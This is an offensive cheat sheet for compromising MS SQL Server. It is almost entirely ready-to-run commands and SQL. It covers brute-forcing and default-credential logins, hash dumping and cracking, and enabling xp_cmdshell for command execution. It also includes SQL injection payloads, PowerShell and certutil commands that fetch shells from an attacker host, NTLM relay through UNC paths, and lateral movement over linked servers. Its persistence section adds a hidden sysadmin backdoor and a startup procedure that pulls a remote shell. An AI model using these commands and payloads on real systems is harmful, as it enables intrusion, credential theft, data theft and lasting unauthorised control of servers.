# MS SQL SERVER ENUMERATION (Port 1433)

## PORT OVERVIEW
```
Port 1433 - MS SQL Server (default)
Port 1434 - MS SQL Monitor (UDP)
Port 2433 - Alternative MS SQL port
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p1433 <IP>                            # Service/Version detection
nmap -p1433 --script ms-sql-info <IP>           # MS SQL server info
nc -nv <IP> 1433                                # Manual connection attempt
```

## NMAP MS SQL ENUMERATION
```bash
nmap --script "ms-sql-*" -p1433 <IP>            # All MS SQL scripts
nmap --script ms-sql-info -p1433 <IP>           # Server information
nmap --script ms-sql-ntlm-info -p1433 <IP>      # NTLM info (domain, hostname)
nmap --script ms-sql-brute -p1433 <IP>          # Brute force
nmap --script ms-sql-empty-password -p1433 <IP> # Test for empty password
nmap --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=password -p1433 <IP>
nmap --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password,ms-sql-xp-cmdshell.cmd="whoami" -p1433 <IP>
```

## NTLM INFORMATION DISCLOSURE
```bash
# Extract domain/hostname without authentication
nmap -p1433 --script ms-sql-ntlm-info <IP>      # Get NetBIOS/DNS names, domain

# Returns:
# - NetBIOS computer name
# - NetBIOS domain name
# - DNS computer name
# - DNS domain name
# - No credentials required!
```

## MSSQLCLIENT (IMPACKET)
```bash
# Connect to MS SQL
impacket-mssqlclient <USER>:<PASSWORD>@<IP>     # Windows authentication
impacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<IP>  # Domain authentication
impacket-mssqlclient -windows-auth <USER>:<PASSWORD>@<IP>  # Explicit Windows auth
impacket-mssqlclient <USER>@<IP> -hashes :<NTLM_HASH>  # Pass-the-hash

# Common commands after connection
SELECT @@version;                               # SQL Server version
SELECT name FROM master.sys.databases;          # List databases
SELECT name FROM master.sys.server_principals;  # List logins
SELECT name FROM sys.databases;                 # Current database info
xp_cmdshell 'whoami';                           # OS command execution (if enabled)
```

## SQSH (ALTERNATIVE CLIENT)
```bash
# Connect with sqsh
sqsh -S <IP> -U <USER> -P <PASSWORD>            # Connect to MS SQL
sqsh -S <IP> -U sa -P password                  # SA account

# After connection
1> SELECT @@version;                            # Version
1> go
1> SELECT name FROM sys.databases;              # List databases
1> go
```

## AUTHENTICATION TESTING
```bash
# Test for default credentials
impacket-mssqlclient sa:@<IP>                   # Empty SA password
impacket-mssqlclient sa:sa@<IP>                 # SA:SA
impacket-mssqlclient sa:password@<IP>           # SA:password
impacket-mssqlclient sa:Password1@<IP>          # SA:Password1

# Common default credentials
sa: (empty)
sa:sa
sa:password
sa:Password1
sa:P@ssw0rd
MSSQLSERVER:password
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l sa -P passwords.txt mssql://<IP>       # Single user
hydra -L users.txt -P passwords.txt mssql://<IP>  # User/pass lists
hydra -l sa -P rockyou.txt -s 1433 mssql://<IP> -t 4  # Limit threads

# Nmap
nmap --script ms-sql-brute -p1433 <IP>
nmap --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt -p1433 <IP>

# Medusa
medusa -h <IP> -u sa -P passwords.txt -M mssql
medusa -h <IP> -U users.txt -P passwords.txt -M mssql

# Metasploit
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS <IP>; set USERNAME sa; set PASS_FILE passwords.txt; run"
```

## ENUMERATE DATABASES
```bash
# After authentication
SELECT name FROM master.sys.databases;          # List all databases
SELECT DB_NAME();                               # Current database
USE <database>;                                 # Switch database
SELECT name FROM sys.tables;                    # List tables in current DB
SELECT * FROM information_schema.tables;        # All tables

# Enumerate tables and columns
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

## EXTRACT DATA
```bash
# Dump data from tables
SELECT * FROM <database>.dbo.<table>;           # Dump table
SELECT username,password FROM users;            # Specific columns

# Search for sensitive data
SELECT * FROM sys.tables WHERE name LIKE '%user%';
SELECT * FROM sys.tables WHERE name LIKE '%password%';
SELECT * FROM sys.tables WHERE name LIKE '%admin%';

# Extract password hashes
SELECT name, password_hash FROM sys.sql_logins;  # SQL logins with hashes
```

## XP_CMDSHELL (COMMAND EXECUTION)
```bash
# Enable xp_cmdshell (requires sysadmin role)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute OS commands
xp_cmdshell 'whoami';
xp_cmdshell 'hostname';
xp_cmdshell 'ipconfig';
xp_cmdshell 'net user';
xp_cmdshell 'powershell -c "whoami"';

# Reverse shell via xp_cmdshell
xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker>/shell.ps1'')"';

# Nmap script for xp_cmdshell
nmap --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password,ms-sql-xp-cmdshell.cmd="whoami" -p1433 <IP>

# Impacket mssqlclient
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## PRIVILEGE ESCALATION
```bash
# Check current user privileges
SELECT IS_SRVROLEMEMBER('sysadmin');            # Check if sysadmin (1=yes, 0=no)
SELECT USER_NAME();                             # Current user
SELECT SYSTEM_USER;                             # Current login

# List all logins and their roles
SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');
EXEC sp_helpsrvrolemember;                      # List role members

# Impersonation (if IMPERSONATE permission)
EXECUTE AS LOGIN = 'sa';                        # Impersonate SA
SELECT SYSTEM_USER;                             # Verify impersonation
REVERT;                                         # Revert to original user

# Check for impersonation permissions
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```

## LINKED SERVERS
```bash
# Enumerate linked servers
EXEC sp_linkedservers;                          # List linked servers
SELECT * FROM sys.servers;                      # All servers
SELECT * FROM sys.linked_logins;                # Linked server logins

# Query linked server
SELECT * FROM [LINKED_SERVER].master.sys.databases;  # Remote query
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];  # Remote command execution

# Crawl linked servers (chain attacks)
EXEC ('EXEC (''SELECT @@version'') AT [SERVER2]') AT [SERVER1];
```

## OLE AUTOMATION (ALTERNATIVE RCE)
```bash
# Enable OLE Automation (alternative to xp_cmdshell)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

# Execute commands via OLE
DECLARE @output INT;
EXEC sp_oacreate 'wscript.shell', @output OUT;
EXEC sp_oamethod @output, 'run', NULL, 'cmd.exe /c whoami > C:\temp\output.txt';
```

## FILE OPERATIONS
```bash
# Read files (requires BULK INSERT permission)
CREATE TABLE temp(data varchar(8000));
BULK INSERT temp FROM 'C:\windows\win.ini';
SELECT * FROM temp;
DROP TABLE temp;

# Write files (xp_cmdshell required)
xp_cmdshell 'echo test > C:\temp\test.txt';
xp_cmdshell 'certutil -urlcache -f http://<attacker>/shell.exe C:\temp\shell.exe';

# Alternative file write (OLE Automation)
DECLARE @OLE INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'CreateTextFile', NULL, 'C:\temp\test.txt', 1;
```

## HASH DUMPING
```bash
# Dump password hashes (requires sysadmin)
SELECT name, password_hash FROM sys.sql_logins;

# Nmap script
nmap --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=password -p1433 <IP>

# Crack hashes
hashcat -m 1731 hashes.txt rockyou.txt          # MS SQL 2012+ (SHA-512)
hashcat -m 132 hashes.txt rockyou.txt           # MS SQL 2005 (SHA-1)
john --format=mssql12 hashes.txt                # John the Ripper
```

## UNC PATH INJECTION (NTLM RELAY)
```bash
# Force SQL Server to authenticate to attacker (NTLM relay)
# Start Responder to capture hash
responder -I eth0 -v

# Trigger authentication via UNC path
EXEC xp_dirtree '\\<attacker_IP>\share';
EXEC xp_fileexist '\\<attacker_IP>\share\file.txt';
EXEC master..xp_subdirs '\\<attacker_IP>\share';

# Relay captured hash with ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/mssql/mssql_ping          # Ping MS SQL instances
use auxiliary/scanner/mssql/mssql_login         # Login scanner
use auxiliary/admin/mssql/mssql_enum            # Enumerate MS SQL
use auxiliary/admin/mssql/mssql_enum_sql_logins # Enumerate SQL logins
use auxiliary/admin/mssql/mssql_exec            # Execute SQL query
use auxiliary/admin/mssql/mssql_sql             # Execute SQL commands
use exploit/windows/mssql/mssql_payload         # Upload and execute payload
```

## SQLI TO RCE
```bash
# If SQL injection exists in web app
# Enable xp_cmdshell via SQLi
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

# Execute command
'; EXEC xp_cmdshell 'whoami'; --

# Download and execute payload
'; EXEC xp_cmdshell 'certutil -urlcache -f http://<attacker>/shell.exe C:\temp\shell.exe'; --
'; EXEC xp_cmdshell 'C:\temp\shell.exe'; --
```

## COMMON MISCONFIGURATIONS
```
☐ SA account with weak/default password
☐ xp_cmdshell enabled
☐ Public role has excessive permissions
☐ SQL Server running as SYSTEM/Administrator
☐ Weak SQL authentication (vs Windows auth)
☐ Unpatched SQL Server (old version)
☐ Linked servers with high privileges
☐ TRUSTWORTHY database property enabled
☐ No firewall rules (SQL exposed to internet)
☐ Guest account enabled in databases
```

## PERSISTENCE
```bash
# Create backdoor user
CREATE LOGIN backdoor WITH PASSWORD = 'Password123!';
ALTER SERVER ROLE sysadmin ADD MEMBER backdoor;

# Startup stored procedure (runs on SQL restart)
CREATE PROCEDURE sp_backdoor
AS
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker>/shell.ps1'')"';
GO
EXEC sp_procoption @ProcName = 'sp_backdoor', @OptionName = 'startup', @OptionValue = 'on';

# SQL Server Agent job (scheduled task)
# Create job that runs reverse shell periodically
```

## QUICK WIN CHECKLIST
```
☐ Test for empty SA password
☐ Test default credentials (sa:sa, sa:password)
☐ Extract NTLM info (domain, hostname) without auth
☐ Brute force weak passwords
☐ Check if xp_cmdshell is enabled
☐ Check for sysadmin privileges
☐ Enumerate linked servers
☐ Test for SQL injection in web apps
☐ Attempt UNC path injection (NTLM relay)
☐ Check for impersonation permissions
☐ Dump password hashes
☐ Enumerate databases for sensitive data
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick MS SQL enumeration
nmap -sV -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password <IP>

# With credentials
impacket-mssqlclient sa:password@<IP> -windows-auth
SQL> SELECT @@version; SELECT name FROM sys.databases; enable_xp_cmdshell; xp_cmdshell whoami;
```

## ADVANCED TECHNIQUES
```bash
# CLR Assembly (custom .NET code execution)
# Upload malicious CLR assembly for code execution

# OPENROWSET (read files, query remote servers)
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=<IP>;Trusted_Connection=yes;', 'SELECT * FROM sys.databases');

# TRUSTWORTHY database escalation
# If database has TRUSTWORTHY=ON, can escalate to sysadmin

# SQL Server Agent exploitation
# If you have SQLAgentUser permissions, create malicious jobs
```

## POST-EXPLOITATION (AFTER SQL ACCESS)
```bash
# After gaining SQL access:
1. Check privileges (sysadmin?)
2. Enable xp_cmdshell for OS command execution
3. Enumerate databases for sensitive data (passwords, PII, PCI)
4. Dump password hashes (crack offline)
5. Check for linked servers (lateral movement)
6. Attempt privilege escalation (impersonation, TRUSTWORTHY)
7. Execute reverse shell (PowerShell, certutil)
8. Create persistence (startup proc, SQL Agent job, backdoor user)
9. Pivot to other systems (linked servers, NTLM relay)

# Extract all data from database
FOR /F "tokens=*" %i IN ('sqlcmd -S <IP> -U sa -P password -Q "SELECT name FROM sys.databases"') DO sqlcmd -S <IP> -U sa -P password -d %i -Q "SELECT * FROM INFORMATION_SCHEMA.TABLES"
```
